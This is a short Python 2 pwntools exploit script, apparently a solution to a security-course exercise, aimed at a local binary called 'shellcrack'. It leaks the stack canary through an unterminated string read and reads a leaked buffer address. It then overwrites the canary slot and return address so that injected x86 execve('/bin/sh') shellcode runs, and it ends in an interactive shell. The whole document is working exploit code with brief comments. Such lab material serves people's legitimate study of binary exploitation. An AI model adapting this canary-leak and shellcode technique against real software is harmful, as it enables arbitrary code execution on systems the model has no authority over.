#!/usr/bin/env python2

from pwn import *

# fread reads 16 bytes without
# appending a null terminator
# send in 16 bytes (15 A's + newline)
# printf prints string. Will print data
# until it hits null terminator
# it will print 15 * "A" + "\n" + canary_value
# returns the 8 bytes of the canary
def get_canary(p):
    p.recvline()                #"Enter as: "
    p.sendline("A"*15)          
    p.recvline()                #"This is the 6447 ...."
    return p.recvline()[:8]


def get_buff_addr(p):
    p.recvuntil("[", drop=True)
    addr = p.recvuntil("]", drop=True)
    return int(addr, 16)


def send_payload(p, payload):
    p.recvline()
    p.sendline(payload)


p = process('./shellcrack')
canary = get_canary(p)
buff_addr = get_buff_addr(p)

shellcode = '''
    call drop
    .string "/bin/sh"
drop:
    pop ebx
    mov eax, 0x0b
    xor ecx, ecx
    xor edx, edx
    int 0x80
'''

payload = fit({
    0: asm(shellcode),
    0x44 - 0x14: canary,
    0x44 + 4: p32(buff_addr)    
})

send_payload(p, payload)

p.interactive()
